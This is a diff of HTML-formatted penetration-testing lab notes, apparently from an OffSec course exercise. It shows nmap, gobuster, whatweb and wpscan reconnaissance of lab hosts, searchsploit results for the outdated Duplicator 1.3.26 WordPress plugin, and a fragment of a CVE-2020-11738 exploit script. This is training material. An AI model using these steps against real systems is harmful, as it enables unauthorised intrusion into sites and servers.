@@ -162,7 +162,7 @@
 <p>Before starting a pentest we want to setup and structure our environment as we will collect a huge amount of information in due course.</p>
 <p><em>Structuring and isolating data and settings for multiple penetration tests can be quite the challenge. By reusing a Kali VM we could accidentally expose previous-client data to new networks. Therefore, it is recommended to use a fresh Kali image for every assessment.</em></p>
 <p>We will create our main directory <code>/home/$USER/OffSec/beyond</code> and two sub-directories for each target we currently have access to.  We will also create a <code>creds.txt</code> file to keep track of valid creds and users.</p>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/beyond]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ tree ../beyond
 ../beyond
 ├── creds.txt
@@ -174,7 +174,7 @@
 <p>Start with a portscan of MAILSRV1 using Nmap, this is often the first active info gathering method we perform to get an overview of ports/services accessible to us.</p>
 <p><em>In a real penetration test, we would also use passive information gathering techniques such as Google Dorks and leaked password databases to obtain additional information. This would potentially provide us with usernames, passwords, and sensitive information.</em></p>
 <p>Use option <code>-sV</code> to enable service/version detection and <code>-sC</code> to use the default Nmap scripts.  Generate an output file with <code>-oN</code> to save the scan results.</p>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/beyond]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.218.242
 [sudo] password for operator:
 Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-28 21:13 PST
@@ -232,7 +232,7 @@ Nmap done: 1 IP address (1 host up) scanned in 31.38 seconds
 <li>We find only the default IIS welcome page.</li>
 </ul>
 <h1>Let&#39;s use <code>gobuster</code> to try to enum directories and files.  Enter <code>dir</code> to use the directory enumeratino mode, <code>-u</code> for URL, <code>-w</code> for wordlist, and <code>-x</code> for the files types we want to identify.  In this case, we will look for <code>txt,pdf,config</code> to identify any documents or config files.  Use <code>-o</code> to create an output file.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ gobuster dir -u <a href="http://192.168.218.242">http://192.168.218.242</a> -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config</h1>
 <h1>Gobuster v3.6
@@ -271,11 +271,11 @@ Now we wil enumerate the second machine in the client topology, WEBSRV1, which w
 *In a real penetration test, we could scan MAILSRV1 and WEBSRV1 in a parallel fashion. Meaning, that we could perform the scans at the same time to save valuable time for the client. If we do so, it&#39;s vital to perform the scans in a structured way to not mix up results or miss findings.*
 
 Start with an Namp scan.
-</code></pre>
-<p>┌──(operator㉿labhost)-[~/OffSec/beyond]
+```bash
+┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ sudo nmap -sC -sV -oN websrv1/nmap 192.168.218.244
 [sudo] password for operator:
-Starting Nmap 7.94 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2023-12-28 22:26 PST
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-28 22:26 PST
 Nmap scan report for 192.168.218.244
 Host is up (0.081s latency).
 Not shown: 998 closed tcp ports (reset)
@@ -285,219 +285,237 @@ PORT   STATE SERVICE VERSION
 |   256 4f:c8:5e:cd:62:a0:78:b4:6e:d8:dd:0e:0b:8b:3a:4c (ECDSA)
 |_  256 8d:6d:ff:a4:98:57:82:95:32:82:64:53:b2:d7:be:44 (ED25519)
 80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
-| http-title: BEYOND Finances &#8211; We provide financial freedom
-|_Requested resource was <a href="http://192.168.218.244/main/">http://192.168.218.244/main/</a>
+| http-title: BEYOND Finances &amp;#8211; We provide financial freedom
+|_Requested resource was http://192.168.218.244/main/
 |_http-generator: WordPress 6.0.2
 |_http-server-header: Apache/2.4.52 (Ubuntu)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
-<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .
-Nmap done: 1 IP address (1 host up) scanned in 13.94 seconds</p>
-<pre><code>- We find SSH port 22 and HTTP port 80.
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-We determine the target is running Ubuntu from the SSH banner.  We can search &quot;OpenSSH 8.9p1 Ubuntu 3&quot; which brings us to a Launchpad web page with a list of OpenSSH versions mapped to specific Ubuntu releases.  In this case, the version is mapped to Jammy Jellyfish, Ubuntu 22.04.
-
-We are only able to perform a password attack on port 22, but we don&#39;t have any usernames or passwords yet so we analyze other services first.  We have Apache 2.4.52 running on port 80.
-
-*We should also search for potential vulnerabilities in Apache 2.4.52 as we did for hMailServer. As this will yield no actionable results, we&#39;ll skip it.*
-
-We begin by browsing to the webpage, the Nmap scan returned the HTTP title BEYOND Finance so we should find a non-default page.
-![d79fb1b122967e1df5ccb258d137ff91.png](../_resources/d79fb1b122967e1df5ccb258d137ff91.png)
-- We find a basic company web page.
-
-At first glance there is no menu bar and there doesn&#39;t appear to be anything actionable.  Let&#39;s inspect the page source code to determine the underlying technology.  We can find artifacts and strings indicating the framework, solution, or CMS in use.
-![d8a98d80dbe4df24409b0e83009ec511.png](../_resources/d8a98d80dbe4df24409b0e83009ec511.png)
-
-The presence of strings &quot;wp-content&quot; and &quot;wp-include&quot; indicate the site is running WordPress.  We can confirm by using `whatweb`.
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.94 seconds
 </code></pre>
-<p>┌──(operator㉿labhost)-[~/OffSec/beyond]
-└─$ whatweb <a href="http://192.168.247.244">http://192.168.247.244</a>
-<a href="http://192.168.247.244">http://192.168.247.244</a> [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.247.244], RedirectLocation[<a href="http://192.168.247.244/main/%5D">http://192.168.247.244/main/]</a>, UncommonHeaders[x-redirect-by]
-<a href="http://192.168.247.244/main/">http://192.168.247.244/main/</a> [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.247.244], JQuery[3.6.0], MetaGenerator[WordPress 6.0.2], Script, Title[BEYOND Finances &#8211; We provide financial freedom], UncommonHeaders[link], WordPress[6.0.2]</p>
-<pre><code>- The output confirms the page uses `WordPress 6.0.2`
-
-The WordPress core often has vulns, but their dev team is quick to patch.  This version was released in August of 2022.
-
-WordPress plugins and themes, often written by the community, often feature improperly patched vulnerabilities or ones that are simply never fixed.  This makes themes and plugins a prime target.
-
-We can perform a scan on these components with `WPScan`, a vuln scanner for WordPress that requires an API token.  A limited API key can be obtained for free by registering an account on the WPScan homepage.  It can still be used effectively without an API key to enumerate WP instances.
-
-To perform a scan without an API key:
-- Target URL `--url`
-- Plugin detection `aggressive`
-- Enum popular plugins `--enumerate p`
-- Output file `-o`
+<ul>
+<li>We find SSH port 22 and HTTP port 80.</li>
+</ul>
+<p>We determine the target is running Ubuntu from the SSH banner.  We can search &quot;OpenSSH 8.9p1 Ubuntu 3&quot; which brings us to a Launchpad web page with a list of OpenSSH versions mapped to specific Ubuntu releases.  In this case, the version is mapped to Jammy Jellyfish, Ubuntu 22.04.</p>
+<p>We are only able to perform a password attack on port 22, but we don&#39;t have any usernames or passwords yet so we analyze other services first.  We have Apache 2.4.52 running on port 80.</p>
+<p><em>We should also search for potential vulnerabilities in Apache 2.4.52 as we did for hMailServer. As this will yield no actionable results, we&#39;ll skip it.</em></p>
+<p>We begin by browsing to the webpage, the Nmap scan returned the HTTP title BEYOND Finance so we should find a non-default page.
+<img src="../_resources/d79fb1b122967e1df5ccb258d137ff91.png" alt="d79fb1b122967e1df5ccb258d137ff91.png"></p>
+<ul>
+<li>We find a basic company web page.</li>
+</ul>
+<p>At first glance there is no menu bar and there doesn&#39;t appear to be anything actionable.  Let&#39;s inspect the page source code to determine the underlying technology.  We can find artifacts and strings indicating the framework, solution, or CMS in use.
+<img src="../_resources/d8a98d80dbe4df24409b0e83009ec511.png" alt="d8a98d80dbe4df24409b0e83009ec511.png"></p>
+<p>The presence of strings &quot;wp-content&quot; and &quot;wp-include&quot; indicate the site is running WordPress.  We can confirm by using <code>whatweb</code>.</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
+└─$ whatweb http://192.168.247.244
+http://192.168.247.244 [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.247.244], RedirectLocation[http://192.168.247.244/main/], UncommonHeaders[x-redirect-by]
+http://192.168.247.244/main/ [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.247.244], JQuery[3.6.0], MetaGenerator[WordPress 6.0.2], Script, Title[BEYOND Finances &amp;#8211; We provide financial freedom], UncommonHeaders[link], WordPress[6.0.2]
 </code></pre>
-<p>┌──(operator㉿labhost)-[~/OffSec/beyond]
-└─$ wpscan --url <a href="http://192.168.247.244">http://192.168.247.244</a> --enumerate p --plugins-detection aggressive -o websrv1/wpscan</p>
-<p>┌──(operator㉿labhost)-[~/OffSec/beyond]
-└─$ cat websrv1/wpscan</p>
-<hr>
-<pre><code>     __          _______   _____
-     \ \        / /  __ \ / ____|
-      \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
-       \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
-        \  /\  /  | |     ____) | (__| (_| | | | |
-         \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+<ul>
+<li>The output confirms the page uses <code>WordPress 6.0.2</code></li>
+</ul>
+<p>The WordPress core often has vulns, but their dev team is quick to patch.  This version was released in August of 2022.</p>
+<p>WordPress plugins and themes, often written by the community, often feature improperly patched vulnerabilities or ones that are simply never fixed.  This makes themes and plugins a prime target.</p>
+<p>We can perform a scan on these components with <code>WPScan</code>, a vuln scanner for WordPress that requires an API token.  A limited API key can be obtained for free by registering an account on the WPScan homepage.  It can still be used effectively without an API key to enumerate WP instances.</p>
+<p>To perform a scan without an API key:</p>
+<ul>
+<li>Target URL <code>--url</code></li>
+<li>Plugin detection <code>aggressive</code></li>
+<li>Enum popular plugins <code>--enumerate p</code></li>
+<li>Output file <code>-o</code></li>
+</ul>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
+└─$ wpscan --url http://192.168.247.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
 
-     WordPress Security Scanner by the WPScan Team
-                     Version 3.8.24
-   Sponsored by Automattic - https://automattic.com/
-   @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
-</code></pre>
-<hr>
-<p>[+] URL: <a href="http://192.168.247.244/">http://192.168.247.244/</a> [192.168.247.244]
-[+] Effective URL: <a href="http://192.168.247.244/main/">http://192.168.247.244/main/</a>
-[+] Started: Fri Dec 29 08:25:53 2023</p>
-<p>Interesting Finding(s):</p>
-<p>[+] Headers
+┌──(operator㉿labhost)-[~/OffSec/beyond]
+└─$ cat websrv1/wpscan
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.24
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://192.168.247.244/ [192.168.247.244]
+[+] Effective URL: http://192.168.247.244/main/
+[+] Started: Fri Dec 29 08:25:53 2023
+
+Interesting Finding(s):
+
+[+] Headers
  | Interesting Entry: Server: Apache/2.4.52 (Ubuntu)
  | Found By: Headers (Passive Detection)
- | Confidence: 100%</p>
-<p>[+] XML-RPC seems to be enabled: <a href="http://192.168.247.244/xmlrpc.php">http://192.168.247.244/xmlrpc.php</a>
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://192.168.247.244/xmlrpc.php
  | Found By: Direct Access (Aggressive Detection)
  | Confidence: 100%
  | References:
- |  - <a href="http://codex.wordpress.org/XML-RPC_Pingback_API">http://codex.wordpress.org/XML-RPC_Pingback_API</a>
- |  - <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/">https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</a>
- |  - <a href="https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/">https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</a>
- |  - <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/">https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</a>
- |  - <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/">https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</a></p>
-<p>[+] WordPress readme found: <a href="http://192.168.247.244/readme.html">http://192.168.247.244/readme.html</a>
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://192.168.247.244/readme.html
  | Found By: Direct Access (Aggressive Detection)
- | Confidence: 100%</p>
-<p>[+] The external WP-Cron seems to be enabled: <a href="http://192.168.247.244/wp-cron.php">http://192.168.247.244/wp-cron.php</a>
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://192.168.247.244/wp-cron.php
  | Found By: Direct Access (Aggressive Detection)
  | Confidence: 60%
  | References:
- |  - <a href="https://www.iplocation.net/defend-wordpress-from-ddos">https://www.iplocation.net/defend-wordpress-from-ddos</a>
- |  - <a href="https://github.com/wpscanteam/wpscan/issues/1299">https://github.com/wpscanteam/wpscan/issues/1299</a></p>
-<p>[+] WordPress version 6.0.2 identified (Insecure, released on 2022-08-30).
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 6.0.2 identified (Insecure, released on 2022-08-30).
  | Found By: Rss Generator (Passive Detection)
- |  - <a href="http://192.168.247.244/main/feed/">http://192.168.247.244/main/feed/</a>, <generator><a href="https://wordpress.org/?v=6.0.2">https://wordpress.org/?v=6.0.2</a></generator>
- |  - <a href="http://192.168.247.244/main/comments/feed/">http://192.168.247.244/main/comments/feed/</a>, <generator><a href="https://wordpress.org/?v=6.0.2">https://wordpress.org/?v=6.0.2</a></generator></p>
-<p>[+] WordPress theme in use: hello-elementor
- | Location: <a href="http://192.168.247.244/wp-content/themes/hello-elementor/">http://192.168.247.244/wp-content/themes/hello-elementor/</a>
+ |  - http://192.168.247.244/main/feed/, &lt;generator&gt;https://wordpress.org/?v=6.0.2&lt;/generator&gt;
+ |  - http://192.168.247.244/main/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.0.2&lt;/generator&gt;
+
+[+] WordPress theme in use: hello-elementor
+ | Location: http://192.168.247.244/wp-content/themes/hello-elementor/
  | Last Updated: 2023-07-05T00:00:00.000Z
- | Readme: <a href="http://192.168.247.244/wp-content/themes/hello-elementor/readme.txt">http://192.168.247.244/wp-content/themes/hello-elementor/readme.txt</a>
+ | Readme: http://192.168.247.244/wp-content/themes/hello-elementor/readme.txt
  | [!] The version is out of date, the latest version is 2.8.1
- | Style URL: <a href="http://192.168.247.244/wp-content/themes/hello-elementor/style.css">http://192.168.247.244/wp-content/themes/hello-elementor/style.css</a>
+ | Style URL: http://192.168.247.244/wp-content/themes/hello-elementor/style.css
  | Style Name: Hello Elementor
- | Style URI: <a href="https://elementor.com/hello-theme/?utm_source=wp-themes&utm_campaign=theme-uri&utm_medium=wp-dash">https://elementor.com/hello-theme/?utm_source=wp-themes&amp;utm_campaign=theme-uri&amp;utm_medium=wp-dash</a>
+ | Style URI: https://elementor.com/hello-theme/?utm_source=wp-themes&amp;utm_campaign=theme-uri&amp;utm_medium=wp-dash
  | Description: A plain-vanilla &amp; lightweight theme for Elementor page builder...
  | Author: Elementor Team
- | Author URI: <a href="https://elementor.com/?utm_source=wp-themes&utm_campaign=author-uri&utm_medium=wp-dash">https://elementor.com/?utm_source=wp-themes&amp;utm_campaign=author-uri&amp;utm_medium=wp-dash</a>
+ | Author URI: https://elementor.com/?utm_source=wp-themes&amp;utm_campaign=author-uri&amp;utm_medium=wp-dash
  |
  | Found By: Urls In Homepage (Passive Detection)
  | Confirmed By: Urls In 404 Page (Passive Detection)
  |
  | Version: 2.6.1 (80% confidence)
  | Found By: Style (Passive Detection)
- |  - <a href="http://192.168.247.244/wp-content/themes/hello-elementor/style.css">http://192.168.247.244/wp-content/themes/hello-elementor/style.css</a>, Match: &#39;Version: 2.6.1&#39;</p>
-<p>[i] Plugin(s) Identified:</p>
-<p>[+] akismet
- | Location: <a href="http://192.168.247.244/wp-content/plugins/akismet/">http://192.168.247.244/wp-content/plugins/akismet/</a>
+ |  - http://192.168.247.244/wp-content/themes/hello-elementor/style.css, Match: &#39;Version: 2.6.1&#39;
+
+
+[i] Plugin(s) Identified:
+
+[+] akismet
+ | Location: http://192.168.247.244/wp-content/plugins/akismet/
  | Latest Version: 5.2
  | Last Updated: 2023-08-07T02:56:00.000Z
  |
  | Found By: Known Locations (Aggressive Detection)
- |  - <a href="http://192.168.247.244/wp-content/plugins/akismet/">http://192.168.247.244/wp-content/plugins/akismet/</a>, status: 500
+ |  - http://192.168.247.244/wp-content/plugins/akismet/, status: 500
  |
- | The version could not be determined.</p>
-<p>[+] classic-editor
- | Location: <a href="http://192.168.247.244/wp-content/plugins/classic-editor/">http://192.168.247.244/wp-content/plugins/classic-editor/</a>
+ | The version could not be determined.
+
+[+] classic-editor
+ | Location: http://192.168.247.244/wp-content/plugins/classic-editor/
  | Last Updated: 2023-08-10T01:17:00.000Z
- | Readme: <a href="http://192.168.247.244/wp-content/plugins/classic-editor/readme.txt">http://192.168.247.244/wp-content/plugins/classic-editor/readme.txt</a>
+ | Readme: http://192.168.247.244/wp-content/plugins/classic-editor/readme.txt
  | [!] The version is out of date, the latest version is 1.6.3
  |
  | Found By: Known Locations (Aggressive Detection)
- |  - <a href="http://192.168.247.244/wp-content/plugins/classic-editor/">http://192.168.247.244/wp-content/plugins/classic-editor/</a>, status: 403
+ |  - http://192.168.247.244/wp-content/plugins/classic-editor/, status: 403
  |
  | Version: 1.6.2 (80% confidence)
  | Found By: Readme - Stable Tag (Aggressive Detection)
- |  - <a href="http://192.168.247.244/wp-content/plugins/classic-editor/readme.txt">http://192.168.247.244/wp-content/plugins/classic-editor/readme.txt</a></p>
-<p>[+] contact-form-7
- | Location: <a href="http://192.168.247.244/wp-content/plugins/contact-form-7/">http://192.168.247.244/wp-content/plugins/contact-form-7/</a>
+ |  - http://192.168.247.244/wp-content/plugins/classic-editor/readme.txt
+
+[+] contact-form-7
+ | Location: http://192.168.247.244/wp-content/plugins/contact-form-7/
  | Last Updated: 2023-08-06T08:25:00.000Z
- | Readme: <a href="http://192.168.247.244/wp-content/plugins/contact-form-7/readme.txt">http://192.168.247.244/wp-content/plugins/contact-form-7/readme.txt</a>
+ | Readme: http://192.168.247.244/wp-content/plugins/contact-form-7/readme.txt
  | [!] The version is out of date, the latest version is 5.8
  |
  | Found By: Known Locations (Aggressive Detection)
- |  - <a href="http://192.168.247.244/wp-content/plugins/contact-form-7/">http://192.168.247.244/wp-content/plugins/contact-form-7/</a>, status: 403
+ |  - http://192.168.247.244/wp-content/plugins/contact-form-7/, status: 403
  |
  | Version: 5.6.3 (90% confidence)
  | Found By: Query Parameter (Passive Detection)
- |  - <a href="http://192.168.247.244/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.6.3">http://192.168.247.244/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.6.3</a>
+ |  - http://192.168.247.244/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.6.3
  | Confirmed By: Readme - Stable Tag (Aggressive Detection)
- |  - <a href="http://192.168.247.244/wp-content/plugins/contact-form-7/readme.txt">http://192.168.247.244/wp-content/plugins/contact-form-7/readme.txt</a></p>
-<p>[+] duplicator
- | Location: <a href="http://192.168.247.244/wp-content/plugins/duplicator/">http://192.168.247.244/wp-content/plugins/duplicator/</a>
+ |  - http://192.168.247.244/wp-content/plugins/contact-form-7/readme.txt
+
+[+] duplicator
+ | Location: http://192.168.247.244/wp-content/plugins/duplicator/
  | Last Updated: 2023-07-20T14:39:00.000Z
- | Readme: <a href="http://192.168.247.244/wp-content/plugins/duplicator/readme.txt">http://192.168.247.244/wp-content/plugins/duplicator/readme.txt</a>
+ | Readme: http://192.168.247.244/wp-content/plugins/duplicator/readme.txt
  | [!] The version is out of date, the latest version is 1.5.5.1
  |
  | Found By: Known Locations (Aggressive Detection)
- |  - <a href="http://192.168.247.244/wp-content/plugins/duplicator/">http://192.168.247.244/wp-content/plugins/duplicator/</a>, status: 403
+ |  - http://192.168.247.244/wp-content/plugins/duplicator/, status: 403
  |
  | Version: 1.3.26 (80% confidence)
  | Found By: Readme - Stable Tag (Aggressive Detection)
- |  - <a href="http://192.168.247.244/wp-content/plugins/duplicator/readme.txt">http://192.168.247.244/wp-content/plugins/duplicator/readme.txt</a></p>
-<p>[+] elementor
- | Location: <a href="http://192.168.247.244/wp-content/plugins/elementor/">http://192.168.247.244/wp-content/plugins/elementor/</a>
+ |  - http://192.168.247.244/wp-content/plugins/duplicator/readme.txt
+
+[+] elementor
+ | Location: http://192.168.247.244/wp-content/plugins/elementor/
  | Last Updated: 2023-08-20T14:11:00.000Z
- | Readme: <a href="http://192.168.247.244/wp-content/plugins/elementor/readme.txt">http://192.168.247.244/wp-content/plugins/elementor/readme.txt</a>
+ | Readme: http://192.168.247.244/wp-content/plugins/elementor/readme.txt
  | [!] The version is out of date, the latest version is 3.15.3
  |
  | Found By: Known Locations (Aggressive Detection)
- |  - <a href="http://192.168.247.244/wp-content/plugins/elementor/">http://192.168.247.244/wp-content/plugins/elementor/</a>, status: 403
+ |  - http://192.168.247.244/wp-content/plugins/elementor/, status: 403
  |
  | Version: 3.7.7 (100% confidence)
  | Found By: Query Parameter (Passive Detection)
- |  - <a href="http://192.168.247.244/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.7.7">http://192.168.247.244/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.7.7</a>
+ |  - http://192.168.247.244/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.7.7
  | Confirmed By:
  |  Readme - Stable Tag (Aggressive Detection)
- |   - <a href="http://192.168.247.244/wp-content/plugins/elementor/readme.txt">http://192.168.247.244/wp-content/plugins/elementor/readme.txt</a>
+ |   - http://192.168.247.244/wp-content/plugins/elementor/readme.txt
  |  Readme - ChangeLog Section (Aggressive Detection)
- |   - <a href="http://192.168.247.244/wp-content/plugins/elementor/readme.txt">http://192.168.247.244/wp-content/plugins/elementor/readme.txt</a></p>
-<p>[+] wordpress-seo
- | Location: <a href="http://192.168.247.244/wp-content/plugins/wordpress-seo/">http://192.168.247.244/wp-content/plugins/wordpress-seo/</a>
+ |   - http://192.168.247.244/wp-content/plugins/elementor/readme.txt
+
+[+] wordpress-seo
+ | Location: http://192.168.247.244/wp-content/plugins/wordpress-seo/
  | Last Updated: 2023-08-28T12:41:00.000Z
- | Readme: <a href="http://192.168.247.244/wp-content/plugins/wordpress-seo/readme.txt">http://192.168.247.244/wp-content/plugins/wordpress-seo/readme.txt</a>
+ | Readme: http://192.168.247.244/wp-content/plugins/wordpress-seo/readme.txt
  | [!] The version is out of date, the latest version is 21.0
  |
  | Found By: Known Locations (Aggressive Detection)
- |  - <a href="http://192.168.247.244/wp-content/plugins/wordpress-seo/">http://192.168.247.244/wp-content/plugins/wordpress-seo/</a>, status: 200
+ |  - http://192.168.247.244/wp-content/plugins/wordpress-seo/, status: 200
  |
  | Version: 19.7.1 (100% confidence)
  | Found By: Readme - Stable Tag (Aggressive Detection)
- |  - <a href="http://192.168.247.244/wp-content/plugins/wordpress-seo/readme.txt">http://192.168.247.244/wp-content/plugins/wordpress-seo/readme.txt</a>
+ |  - http://192.168.247.244/wp-content/plugins/wordpress-seo/readme.txt
  | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
- |  - <a href="http://192.168.247.244/wp-content/plugins/wordpress-seo/readme.txt">http://192.168.247.244/wp-content/plugins/wordpress-seo/readme.txt</a></p>
-<p>[!] No WPScan API Token given, as a result vulnerability data has not been output.
-[!] You can get a free API token with 25 daily requests by registering at <a href="https://wpscan.com/register">https://wpscan.com/register</a></p>
-<p>[+] Finished: Fri Dec 29 08:26:56 2023
+ |  - http://192.168.247.244/wp-content/plugins/wordpress-seo/readme.txt
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Fri Dec 29 08:26:56 2023
 [+] Requests Done: 1556
 [+] Cached Requests: 16
 [+] Data Sent: 433.651 KB
 [+] Data Received: 910.466 KB
 [+] Memory used: 222.477 MB
-[+] Elapsed time: 00:01:03</p>
-<pre><code>- 6 active plugins detected.
- - Akisment.
- - Classic-editor.
- - Contact-form-7.
- - Duplicator.
-  - Plugin is outdated.
- - Elementor.
- - Wordpress-seo.
-
-Instead of using the WPscan vuln DB, we can use `searchsploit` to find vulns associated with the plugins.  For most identified plugins WPScan provides the detected version, most were up to date and none provided for akisment, so we will start with Duplicator.
+[+] Elapsed time: 00:01:03
 </code></pre>
-<p>┌──(operator㉿labhost)-[~/OffSec/beyond]
-└─$ searchsploit duplicator</p>
-<hr>
-<p> Exploit Title                                           |  Path</p>
-<hr>
-<p>WordPress Plugin Duplicator - Cross-Site Scripting       | php/webapps/38676.txt
+<ul>
+<li>6 active plugins detected.</li>
+<li>Akisment.</li>
+<li>Classic-editor.</li>
+<li>Contact-form-7.</li>
+<li>Duplicator.</li>
+<li>Plugin is outdated.</li>
+<li>Elementor.</li>
+<li>Wordpress-seo.</li>
+</ul>
+<p>Instead of using the WPscan vuln DB, we can use <code>searchsploit</code> to find vulns associated with the plugins.  For most identified plugins WPScan provides the detected version, most were up to date and none provided for akisment, so we will start with Duplicator.</p>
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/beyond]
+└─$ searchsploit duplicator
+--------------------------------------------------------- ---------------------------------
+ Exploit Title                                           |  Path
+--------------------------------------------------------- ---------------------------------
+WordPress Plugin Duplicator - Cross-Site Scripting       | php/webapps/38676.txt
 WordPress Plugin Duplicator 0.5.14 - SQL Injection / Cro | php/webapps/36735.txt
 WordPress Plugin Duplicator 0.5.8 - Privilege Escalation | php/webapps/36112.txt
 WordPress Plugin Duplicator 1.2.32 - Cross-Site Scriptin | php/webapps/44288.txt
@@ -505,69 +523,78 @@ Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arb | php/webapps/49288.rb
 Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arb | php/webapps/50420.py
 WordPress Plugin Duplicator 1.4.6 - Unauthenticated Back | php/webapps/50992.txt
 WordPress Plugin Duplicator 1.4.7 - Information Disclosu | php/webapps/50993.txt
-WordPress Plugin Multisite Post Duplicator 0.9.5.1 - Cro | php/webapps/40908.html</p>
-<hr>
-<p>Shellcodes: No Results</p>
-<pre><code>- Two exploits matching version `1.3.26`
- - One of which developed for Metasploit.
-
-To summarize what we learned about WEBSRV1:
-- Target runs Ubuntu 22.04.
-- Open ports 22 and 80.
-- WordPress instance.
-    - Duplicator is outdated with 2 matching exploits in `searchsploit`
-
-#### 24.2 Attacking a Public Machine
-
-- Use vulnerabilities in WordPress Plugins .
-- Crack the passphrase of an SSH private key.
-- Elevate privileges using sudo commands.
-- Leverage developer artifacts to obtain sensitive information.
-
-##### Initial Foothold
-
-In the prior unit we used SearchSploit to find exploits for Duplicator 1.3.26, two matched this version, and one was a Metasploit exploit.  Use SearchSploit to examine the other exploit.
+WordPress Plugin Multisite Post Duplicator 0.9.5.1 - Cro | php/webapps/40908.html
+--------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
 </code></pre>
-<p>┌──(operator㉿labhost)-[~/OffSec/beyond]
-└─$ searchsploit duplicator</p>
-<hr>
-<h1>Vendor Homepage: <a href="https://wordpress.org/plugins/duplicator/">https://wordpress.org/plugins/duplicator/</a></h1>
-<h1>Software Link: <a href="https://downloads.wordpress.org/plugin/duplicator.1.3.26.zip%5D">https://downloads.wordpress.org/plugin/duplicator.1.3.26.zip]</a></h1>
-<h1>Version: 1.3.26</h1>
-<h1>Tested on: Ubuntu 16.04</h1>
-<h1>CVE : CVE-2020-11738</h1>
-<p>import requests as re
-import sys</p>
-<p>if len(sys.argv) != 3:
+<ul>
+<li>Two exploits matching version <code>1.3.26</code></li>
+<li>One of which developed for Metasploit.</li>
+</ul>
+<p>To summarize what we learned about WEBSRV1:</p>
+<ul>
+<li>Target runs Ubuntu 22.04.</li>
+<li>Open ports 22 and 80.</li>
+<li>WordPress instance.<ul>
+<li>Duplicator is outdated with 2 matching exploits in <code>searchsploit</code></li>
+</ul>
+</li>
+</ul>
+<h4>24.2 Attacking a Public Machine</h4>
+<ul>
